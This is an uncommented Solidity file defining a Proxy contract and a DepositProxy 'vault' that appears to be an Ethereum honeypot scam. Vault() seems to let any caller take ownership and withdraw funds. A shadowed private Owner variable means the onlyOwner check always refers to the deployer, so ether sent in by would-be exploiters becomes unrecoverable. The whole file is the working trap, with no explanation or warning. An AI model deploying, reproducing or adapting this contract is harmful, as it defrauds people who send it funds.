pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == getOwner()) _; } address private Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
    
    function getOwner() internal view returns (address) { return Owner; }
}

contract DepositProxy is Proxy {
    address private Owner;
    mapping (address => uint256) private Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] = getDeposit(msg.sender) + msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && getDeposit(msg.sender)>=amount) {
            msg.sender.transfer(amount);
        }
    }
    
    function getDeposit(address depositor) internal view returns (uint256) {
        return Deposits[depositor];
    }
}